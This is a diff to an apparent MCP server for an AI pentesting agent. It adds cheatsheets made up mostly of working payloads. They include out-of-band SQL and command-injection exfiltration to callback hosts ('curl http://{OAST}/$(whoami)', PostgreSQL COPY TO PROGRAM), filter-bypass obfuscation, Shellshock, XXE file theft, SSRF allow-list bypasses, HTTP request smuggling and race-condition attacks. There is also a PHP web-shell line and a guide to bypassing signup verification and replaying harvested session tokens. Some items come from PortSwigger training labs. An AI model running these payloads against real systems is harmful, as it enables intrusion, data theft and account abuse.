@@ -120,6 +120,38 @@ ASCII(SUBSTRING(database(),1,1))>109-- -
 \`\`\`
 ' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>', 3 INTO OUTFILE '/var/www/html/shell.php'-- -
 \`\`\`
+
+## OOB SQLi Exfiltration
+
+When blind injection is confirmed but time-based extraction is too slow, use out-of-band (OOB) techniques with interactsh (\`oob_start_listener\` + \`oob_generate_payload\`):
+
+### Oracle
+\`\`\`
+' UNION SELECT UTL_HTTP.REQUEST('http://{OAST}/'||(SELECT user FROM dual)) FROM dual--
+' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.{OAST}') FROM dual--
+' UNION SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.{OAST}',80) FROM dual--
+\`\`\`
+
+### MSSQL
+\`\`\`
+'; EXEC master..xp_dirtree '\\\\{OAST}\\a'--
+'; EXEC master..xp_subdirs '\\\\{OAST}\\a'--
+'; DECLARE @q VARCHAR(1024); SET @q='\\\\'+db_name()+'.{OAST}\\a'; EXEC master..xp_dirtree @q--
+\`\`\`
+
+### MySQL
+\`\`\`
+' UNION SELECT LOAD_FILE('\\\\\\\\{OAST}\\\\a')-- -
+' UNION SELECT 1 INTO OUTFILE '\\\\\\\\{OAST}\\\\a'-- -
+\`\`\`
+
+### PostgreSQL
+\`\`\`
+'; COPY (SELECT '') TO PROGRAM 'curl http://{OAST}/'||(SELECT current_user)--
+'; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_user)||'.{OAST}'--
+\`\`\`
+
+Poll results with \`oob_poll_interactions\` — DNS callbacks contain exfiltrated data as subdomains, HTTP callbacks contain data in the URL path.
 `
       }]
     })
@@ -278,6 +310,30 @@ Prototype pollution lets an attacker inject properties on \`Object.prototype\` t
 3. Search JS for sinks that read undefined properties: \`script.src\`, \`eval()\`, \`innerHTML\`, \`location\`
 4. Use DOM Invader (Burp) or manual grep for gadgets in third-party libraries (jQuery, Lodash, etc.)
 5. For server-side: inject \`{"__proto__":{"json spaces":10}}\` in JSON endpoints — if subsequent responses have 10-space indentation, server-side pollution is confirmed
+
+## Lab: XSS when event handlers and href are blocked (PortSwigger)
+- When the WAF blocks all event handler attributes (\`onerror\`, \`onload\`, \`onbegin\`, etc.) AND \`href\` attributes
+- SVG \`<animate>\` element can set \`href\` attribute dynamically, bypassing static attribute blocking
+- Payload: \`<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>\`
+- The \`<animate>\` element sets the \`href\` of the parent \`<a>\` to \`javascript:alert(1)\` at render time
+- Requires user interaction (click) but bypasses WAFs that only block static \`href\` assignment
+
+## Lab: XSS with CSP bypass via policy injection (PortSwigger)
+- Reflected input in a CSP directive token parameter allows injecting additional CSP directives
+- Inject \`script-src-elem 'unsafe-inline'\` to override the restrictive \`script-src\` policy
+- CSP parsing: last directive wins when duplicated — injected \`script-src-elem\` takes precedence
+- Payload: \`token=;script-src-elem 'unsafe-inline'\` in the reflected parameter
+- Then inject inline script normally: \`<script>alert(1)</script>\` now executes because CSP allows it
+- Detection: look for reflected values appearing inside \`Content-Security-Policy\` response headers
+
+## Lab: DOM clobbering XSS (PortSwigger)
+- DOM clobbering uses HTML elements with \`id\`/\`name\` attributes to overwrite global JS variables
+- When JS accesses \`window.someVar\` and it's undefined, an element with \`id="someVar"\` will be returned instead
+- Dual anchor technique: two \`<a>\` tags with the same \`id\` create an HTMLCollection; accessing \`collection.property\` returns the anchor with matching \`name\`
+- Payload (via comments or HTML injection): \`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">\`
+- The code reads \`defaultAvatar.avatar\` which returns the second anchor's \`href\` (via named property)
+- The \`href\` value containing \`cid:"onerror=alert(1)//\` is injected into an HTML context (e.g., \`img src\`)
+- Key: \`cid:\` protocol prefix is allowed by DOMPurify/sanitizers; the \`"\` breaks out of the attribute
 `
       }]
     })
@@ -355,6 +411,33 @@ Runs regardless of prior command exit status.
 ||whoami > /var/www/images/output.txt||
 \`\`\`
 Then retrieve via image endpoint.
+
+## Blind CMDi via OOB (Interactsh)
+
+When time-based detection is unreliable or blocked, use out-of-band callbacks via interactsh:
+
+### Setup
+Start an interactsh listener with \`oob_start_listener\` to get a unique callback domain.
+
+### OOB Payloads
+\`\`\`
+; nslookup {OAST}
+; curl http://{OAST}/\$(whoami)
+; wget http://{OAST}/\$(id|base64)
+| nslookup \$(whoami).{OAST}
+\`$(nslookup {OAST})\`
+\$(curl http://{OAST}/\$(hostname))
+%0anslookup%20{OAST}
+\`\`\`
+
+### With Filter Bypass
+\`\`\`
+;n\\'s\\'l\\'o\\'o\\'k\\'u\\'p\${IFS}{OAST}
+;\$(printf '\\x6e\\x73\\x6c\\x6f\\x6f\\x6b\\x75\\x70')\${IFS}{OAST}
+\`\`\`
+
+### Correlation
+Use \`oob_poll_interactions\` to check for DNS/HTTP callbacks. The callback confirms blind command execution even when there is no visible output or measurable time delay.
 `
       }]
     })
@@ -481,8 +564,65 @@ Required header: \`Metadata: true\`
 </foo>
 \`\`\`
 
+## Allow List Bypass via URL Parsing Confusion
+When the server validates that the URL hostname contains an allowed domain:
+\`\`\`
+# Step 1: Use @ to embed credentials — parser reads host after @
+http://allowed-host@attacker.com
+
+# Step 2: Use # fragment to confuse parser
+http://allowed-host#@attacker.com
+
+# Step 3: Double URL-encode the # as %2523
+http://allowed-host%2523@attacker.com/admin
+\`\`\`
+The \`%2523\` double-encodes \`#\`: first decode gives \`%23\`, second decode gives \`#\`.
+The allow list check sees \`allowed-host\` in the URL and passes, but the back-end fetcher decodes \`%2523\` to \`#\`, treating everything before it as a fragment and resolving to \`attacker.com/admin\`.
+Combine with \`@\` credential syntax and \`#\` fragment injection for maximum confusion.
+
+## Lab: SSRF with whitelist-based input filter bypass (PortSwigger)
+- Server validates that the URL contains the allowed hostname (e.g., \`stock.weliketoshop.net\`)
+- Use \`@\` credential trick: \`http://stock.weliketoshop.net@127.0.0.1/\` — server sees allowed host in URL, but fetcher resolves to \`127.0.0.1\`
+- Double URL-encode \`#\` as \`%2523\` to inject a fragment: \`http://stock.weliketoshop.net%2523@127.0.0.1/admin\`
+- First URL decode: \`%2523\` → \`%23\`; second URL decode: \`%23\` → \`#\` → everything before \`#\` becomes fragment
+- Final resolved URL: \`http://127.0.0.1/admin\` with \`stock.weliketoshop.net\` as discarded credentials/fragment
+- This bypasses hostname allow lists that use simple string matching
+
 ## Vulnerable Parameters to Test
 \`url\`, \`uri\`, \`path\`, \`src\`, \`dest\`, \`redirect\`, \`page\`, \`feed\`, \`host\`, \`site\`, \`html\`, \`data\`, \`reference\`, \`callback\`
+
+## Blind SSRF via Interactsh
+
+When SSRF responses are not reflected back (blind SSRF), use interactsh for out-of-band confirmation:
+
+### Setup
+Start an interactsh listener with \`oob_start_listener\` to get a unique callback domain.
+
+### Blind SSRF Payloads
+\`\`\`
+# Direct URL injection
+url=http://{OAST}
+stockApi=http://{OAST}/test
+
+# With protocol smuggling
+url=http://{OAST}%23@allowed-domain.com
+url=http://allowed-domain@{OAST}
+
+# DNS rebinding variant
+url=http://{OAST}.rebind.127.0.0.1.nip.io
+\`\`\`
+
+### Shellshock on Internal Hosts
+If SSRF can reach internal servers running vulnerable CGI scripts:
+\`\`\`
+# Inject Shellshock via User-Agent through SSRF
+User-Agent: () { :;}; curl {OAST}/\$(whoami)
+Referer: http://192.168.0.X:8080/cgi-bin/status
+\`\`\`
+Use SSRF to make the server send requests to internal hosts with Shellshock payloads in headers.
+
+### Correlation
+Use \`oob_poll_interactions\` to confirm the server made an outbound request. DNS callbacks confirm network-level access; HTTP callbacks confirm full SSRF with response data potential.
 
 ## Lab: SSRF with filter bypass via open redirection (PortSwigger)
 - Chain SSRF through open redirect at \`/product/nextProduct\` to bypass SSRF URL filters
@@ -771,6 +911,18 @@ POST /forgot-password  (username=victim)
 # Both sent via h2 in one packet → same server-side timestamp → same token
 \`\`\`
 Use the token from the attacker's email to reset the victim's password.
+
+## Race Condition: Single-Packet Attack via \`race_single_packet\`
+
+Use the \`race_single_packet\` tool for HTTP/2 multiplexed concurrent requests. This sends all requests in a single TCP frame, achieving sub-millisecond synchronization that defeats sequential rate limiters and exploits TOCTOU (time-of-check-time-of-use) windows.
+
+### Key scenarios:
+- **Rate limit bypass:** Send 20+ login attempts simultaneously before the counter increments.
+- **Multi-endpoint TOCTOU:** Race cart-add against checkout to exploit stale pricing.
+- **Single-endpoint race:** Two concurrent email-change requests — confirmation email sent to wrong recipient.
+- **Token collision:** Timestamp-derived tokens collide when two resets fire in the same packet.
+
+For sub-millisecond synchronization requirements, use \`race_last_byte_sync\` which withholds the last byte of each request body and releases them simultaneously.
 `
       }]
     })
@@ -2060,6 +2212,399 @@ tshark -r capture.pcap -Y "tls.handshake.type == 12" -T fields -e tls.handshake.
 \`\`\`bash
 tshark -r capture.pcap -Y "ntlmssp.auth" -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.auth.hostname
 \`\`\`
+`
+      }]
+    })
+  );
+
+  // ---------------------------------------------------------------------------
+  // Signup Patterns Cheatsheet
+  // ---------------------------------------------------------------------------
+  server.resource(
+    "signup_patterns_cheatsheet",
+    "operant://signup_patterns_cheatsheet",
+    { description: "Account creation patterns, verification bypass, session harvesting, and Bitwarden/TextVerified CLI reference", mimeType: "text/markdown" },
+    async () => ({
+      contents: [{
+        uri: "operant://signup_patterns_cheatsheet",
+        mimeType: "text/markdown",
+        text: `# Signup & Session Harvesting Cheatsheet
+
+## Bitwarden CLI Reference
+\`\`\`bash
+# Unlock vault
+export BW_SESSION=$(bw unlock --passwordenv BW_MASTER_PASSWORD --raw)
+
+# Search for existing credentials
+bw list items --search "domain" --session "$BW_SESSION"
+
+# Generate a strong password
+bw generate --length 20 --special --session "$BW_SESSION"
+
+# Get TOTP code for an item
+bw get totp "{item_id}" --session "$BW_SESSION"
+
+# Create a folder
+echo '{"name":"SecurityTesting"}' | bw encode | bw create folder --session "$BW_SESSION"
+
+# Create an item
+echo '{...}' | bw encode | bw create item --session "$BW_SESSION"
+
+# Edit item (add TOTP secret)
+bw get item {id} | jq '.login.totp = "{secret}"' | bw encode | bw edit item {id} --session "$BW_SESSION"
+\`\`\`
+
+## TextVerified.com API (Phone Verification)
+\`\`\`
+Headers: X-SIMPLE-API-ACCESS-TOKEN: {api_key}
+Base URL: https://www.textverified.com/api
+\`\`\`
+- **Rent number**: \`POST /Verifications\` body: \`{"id": "{service_id}"}\`
+- **Check targets**: \`GET /Targets\` — list available services
+- **Poll status**: \`GET /Verifications/{id}\` — returns \`smsContent\` when received
+- **Typical flow**: rent → enter number in form → poll → enter code → release
+
+## TOTP Setup Extraction
+- Look for \`otpauth://\` URI in QR code \`data:\` attribute
+- Parse: \`otpauth://totp/Label?secret=BASE32SECRET&issuer=App\`
+- Text secret: usually displayed as groups of 4 chars (e.g., JBSW Y3DP EHPK 3PXP)
+- Generate code: \`oathtool --totp -b "BASE32SECRET"\`
+- Python: \`python3 -c "import pyotp; print(pyotp.TOTP('BASE32SECRET').now())"\`
+- QR extraction via browser: \`document.querySelector('img[src*="qr"]').src\` or canvas toDataURL
+
+## Common Session Token Locations
+| Location | Common Keys |
+|----------|-------------|
+| Cookies | \`session\`, \`sid\`, \`connect.sid\`, \`PHPSESSID\`, \`JSESSIONID\`, \`_session_id\` |
+| localStorage | \`access_token\`, \`token\`, \`jwt\`, \`auth_token\`, \`id_token\` |
+| sessionStorage | \`accessToken\`, \`authToken\` |
+| Headers | \`Authorization: Bearer {token}\`, \`X-CSRF-Token\`, \`X-Auth-Token\` |
+
+## Signup Form Patterns
+- **React forms**: use \`pressSequentially()\` not \`fill()\` — React needs keystroke events
+- **Angular forms**: \`fill()\` usually works, trigger blur after
+- **Vue forms**: \`fill()\` works, may need \`change\` event dispatch
+- **Vanilla**: standard \`fill()\` is fine
+- **Hidden honeypot fields**: leave empty (bot detection)
+- **Password strength**: generate 20+ char with special chars
+
+## Email Verification Patterns
+- **Auto-confirm**: some apps auto-confirm in dev mode (check \`mailer_autoconfirm\` for Supabase)
+- **Predictable tokens**: check if verification URL uses sequential/guessable tokens
+- **Resend endpoint**: useful for timing attacks
+- **Check spam folder** in burner email
+
+## Payment Wall Handling
+- **Trial signups**: use card for $0 auth charge (Stripe test mode may accept 4242...)
+- **Free tier**: always check if free tier exists before using card
+- **Coupon codes**: try TRIAL, FREE, BETA, LAUNCH, STARTUP
+- **Never make actual purchases** without user confirmation
+
+## Session Bundle JSON Schema
+\`\`\`json
+{
+  "target": "https://target.com",
+  "cookies": [{"name": "...", "value": "...", "domain": "...", "path": "/", "httpOnly": true, "secure": true}],
+  "localStorage": {"key": "value"},
+  "sessionStorage": {"key": "value"},
+  "headers": {"Authorization": "Bearer ...", "X-CSRF-Token": "..."},
+  "csrf_token": "...",
+  "account": {"email": "...", "has_2fa": true},
+  "harvested_at": "ISO8601"
+}
+\`\`\`
+
+## Endpoint Map JSON Schema
+\`\`\`json
+{
+  "endpoints": [
+    {"url": "/api/...", "method": "GET|POST|...", "params": [...], "auth_type": "Bearer|Cookie|...", "idor_candidate": false, "csrf_required": false}
+  ],
+  "websockets": ["wss://..."],
+  "graphql_endpoint": "/graphql",
+  "total_discovered": 0
+}
+\`\`\`
+
+## curl with Harvested Session
+\`\`\`bash
+# Cookie-based auth
+curl -b "session=abc123; csrf=xyz789" https://target.com/api/me
+
+# Bearer token auth
+curl -H "Authorization: Bearer eyJ..." https://target.com/api/me
+
+# Both + CSRF
+curl -b "session=abc123" -H "X-CSRF-Token: xyz789" -X POST https://target.com/api/settings -d '{"email":"new@test.com"}'
+\`\`\`
+`
+      }]
+    })
+  );
+
+  // ---------------------------------------------------------------------------
+  // OOB Testing Cheatsheet (NEW)
+  // ---------------------------------------------------------------------------
+  server.resource(
+    "oob_testing_cheatsheet",
+    "operant://oob_testing_cheatsheet",
+    { description: "Out-of-band (OOB) testing methodology using interactsh — setup, payload generation per attack type, polling, and correlation.", mimeType: "text/markdown" },
+    async () => ({
+      contents: [{
+        uri: "operant://oob_testing_cheatsheet",
+        mimeType: "text/markdown",
+        text: `# Out-of-Band (OOB) Testing Cheatsheet
+
+## Interactsh Setup and Usage
+
+Start a listener with \`oob_start_listener\` to get a unique callback domain (e.g., \`abc123.oast.fun\`).
+Generate attack-specific payloads with \`oob_generate_payload(attack_type)\`.
+Poll for results with \`oob_poll_interactions\` — returns DNS, HTTP, and SMTP callbacks with timestamps.
+
+## OOB Payloads by Attack Type
+
+### Oracle SQLi
+\`\`\`
+' UNION SELECT UTL_HTTP.REQUEST('http://{OAST}/'||(SELECT user FROM dual)) FROM dual--
+' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.{OAST}') FROM dual--
+' UNION SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.{OAST}',80) FROM dual--
+\`\`\`
+
+### MSSQL SQLi
+\`\`\`
+'; EXEC master..xp_dirtree '\\\\{OAST}\\a'--
+'; EXEC master..xp_subdirs '\\\\{OAST}\\a'--
+'; DECLARE @q VARCHAR(1024); SET @q='\\\\'+db_name()+'.{OAST}\\a'; EXEC master..xp_dirtree @q--
+\`\`\`
+
+### MySQL SQLi
+\`\`\`
+' UNION SELECT LOAD_FILE('\\\\\\\\{OAST}\\\\a')-- -
+' UNION SELECT 1 INTO OUTFILE '\\\\\\\\{OAST}\\\\a'-- -
+\`\`\`
+
+### PostgreSQL SQLi
+\`\`\`
+'; COPY (SELECT '') TO PROGRAM 'curl http://{OAST}/'||(SELECT current_user)--
+'; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_user)||'.{OAST}'--
+\`\`\`
+
+### XXE (XML External Entity)
+\`\`\`xml
+<!-- Direct entity -->
+<!ENTITY xxe SYSTEM "http://{OAST}">
+
+<!-- Parameter entity (for blind XXE) -->
+<!ENTITY % xxe SYSTEM "http://{OAST}">
+%xxe;
+
+<!-- Parameter entity with data exfil -->
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{OAST}/?d=%file;'>">
+%eval;%exfil;
+\`\`\`
+
+### SSRF (Server-Side Request Forgery)
+\`\`\`
+# Direct URL injection
+url=http://{OAST}
+stockApi=http://{OAST}/ssrf-test
+
+# DNS rebinding
+url=http://{OAST}.rebind.127.0.0.1.nip.io
+
+# Via Referer header
+Referer: http://{OAST}
+\`\`\`
+
+### Command Injection (CMDi)
+\`\`\`
+; nslookup {OAST}
+; curl http://{OAST}/\$(whoami)
+; wget http://{OAST}/\$(id|base64)
+| nslookup \$(whoami).{OAST}
+\\\`\$(nslookup {OAST})\\\`
+\$(curl http://{OAST}/\$(hostname))
+%0anslookup%20{OAST}
+\`\`\`
+
+## Polling for Results and Correlation
+
+1. After injecting OOB payloads, wait 5-10 seconds for callbacks to arrive.
+2. Run \`oob_poll_interactions\` to retrieve all interactions.
+3. Correlate by:
+   - **DNS callbacks**: The subdomain prefix contains exfiltrated data (e.g., \`admin.{OAST}\` means the DB user is "admin").
+   - **HTTP callbacks**: The URL path contains exfiltrated data (e.g., \`GET /root\` from \`whoami\`).
+   - **Timing**: Match interaction timestamps with injection request timestamps.
+4. Use unique payload identifiers per injection point to correlate which parameter triggered the callback.
+`
+      }]
+    })
+  );
+
+  // ---------------------------------------------------------------------------
+  // HTTP Smuggling Cheatsheet (NEW)
+  // ---------------------------------------------------------------------------
+  server.resource(
+    "http_smuggling_cheatsheet",
+    "operant://http_smuggling_cheatsheet",
+    { description: "HTTP request smuggling techniques — CL.TE, TE.CL, H2 desync, CL.0, 0.CL, pause-based, client-side desync, raw socket examples.", mimeType: "text/markdown" },
+    async () => ({
+      contents: [{
+        uri: "operant://http_smuggling_cheatsheet",
+        mimeType: "text/markdown",
+        text: `# HTTP Request Smuggling Cheatsheet
+
+## HTTP/1.1 Smuggling
+
+### CL.TE (Front-end uses Content-Length, back-end uses Transfer-Encoding)
+\`\`\`
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0\\r\\n
+\\r\\n
+G
+\`\`\`
+Front-end forwards all 6 bytes. Back-end sees chunked terminator and leaves "G" in the buffer. Next request becomes "GPOST" — confirms with "Unrecognized method GPOST".
+
+Use \`raw_http_send\` to send this payload with exact byte control.
+
+### TE.CL (Front-end uses Transfer-Encoding, back-end uses Content-Length)
+\`\`\`
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c\\r\\n
+GPOST / HTTP/1.1\\r\\n
+Content-Type: application/x-www-form-urlencoded\\r\\n
+Content-Length: 15\\r\\n
+\\r\\n
+x=1\\r\\n
+0\\r\\n
+\\r\\n
+\`\`\`
+Front-end forwards chunked body. Back-end reads only 4 bytes (CL:4), leaving the smuggled "GPOST" request.
+
+### TE Obfuscation
+When both servers support TE, use obfuscated Transfer-Encoding to force one to fall back to CL:
+\`\`\`
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-encoding: chunked
+Transfer-Encoding:\\tchunked
+Transfer-Encoding: chunked\\r\\nX: x
+\`\`\`
+
+### 0.CL (Zero Content-Length Front-end)
+\`\`\`
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 0
+Transfer-Encoding: chunked
+
+GET /admin HTTP/1.1
+Host: target.com
+\`\`\`
+Front-end sees CL:0 and forwards the connection. Back-end processes the trailing data as a new request.
+
+### CL.0 (Back-end Ignores Content-Length)
+\`\`\`
+POST /resources/images/blog.svg HTTP/1.1
+Host: target.com
+Content-Length: 50
+Connection: keep-alive
+
+GET /admin HTTP/1.1
+Host: target.com
+\`\`\`
+Back-end ignores CL on static paths. The body is treated as a new request on the same connection.
+
+## HTTP/2 Smuggling
+
+### H2.CL (HTTP/2 to HTTP/1.1 Content-Length Desync)
+\`\`\`python
+# Using h2 library with validate_outbound_headers=False
+import h2.connection
+conn = h2.connection.H2Connection()
+headers = [
+    (':method', 'POST'),
+    (':path', '/'),
+    (':authority', 'target.com'),
+    ('content-length', '0'),  # H2 says 0 bytes
+]
+conn.send_headers(stream_id, headers)
+conn.send_data(stream_id, b'GET /admin HTTP/1.1\\r\\nHost: target.com\\r\\n\\r\\n')
+\`\`\`
+Use \`raw_h2_smuggle\` for automated H2 desync attacks.
+
+### H2.TE (HTTP/2 to Transfer-Encoding)
+\`\`\`python
+headers = [
+    (':method', 'POST'),
+    (':path', '/'),
+    (':authority', 'target.com'),
+    ('transfer-encoding', 'chunked'),  # Normally forbidden in H2
+]
+body = b'0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: target.com\\r\\n\\r\\n'
+\`\`\`
+
+### H2 CRLF Injection
+Inject \\\\r\\\\n into HTTP/2 header values to smuggle additional headers in the HTTP/1.1 downgrade:
+\`\`\`python
+headers = [
+    (':method', 'POST'),
+    (':path', '/'),
+    (':authority', 'target.com'),
+    ('foo', 'bar\\r\\nTransfer-Encoding: chunked'),
+]
+\`\`\`
+
+### H2 Request Splitting
+Inject a complete request into an H2 header value:
+\`\`\`python
+headers = [
+    (':method', 'GET'),
+    (':path', '/'),
+    (':authority', 'target.com'),
+    ('foo', 'bar\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: target.com'),
+]
+\`\`\`
+
+## Connection State Attacks
+
+### Host Header Connection State
+\`\`\`
+# Request 1: Establish connection with allowed host
+GET / HTTP/1.1
+Host: allowed-host.com
+Connection: keep-alive
+
+# Request 2: On same connection, switch to internal host
+GET /admin HTTP/1.1
+Host: internal-admin.local
+\`\`\`
+Use \`raw_connection_reuse\` to send multiple requests on a single persistent connection. Some reverse proxies only validate the Host header on the first request.
+
+## Client-Side Desync
+Trigger a browser to desync its own connection to a vulnerable server:
+1. Use \`fetch()\` with a body on a GET/HEAD request (browser sends CL, server ignores it)
+2. Poisoned response is served to the next navigation on the same connection
+3. Combine with stored response poisoning for persistent XSS
+
+## Pause-Based Smuggling
+Send the request headers and partial body, then pause for longer than the front-end timeout but shorter than the back-end timeout. The front-end forwards what it has; the remaining bytes are treated as a new request by the back-end.
+
+## Tool Reference
+- \`raw_http_send\`: Send raw HTTP/1.1 requests with exact byte control for CL.TE/TE.CL
+- \`raw_h2_smuggle\`: Send HTTP/2 frames with forbidden headers for H2.CL/H2.TE/CRLF attacks
+- \`raw_connection_reuse\`: Send multiple requests on a single connection for Host header state attacks
 `
       }]
     })
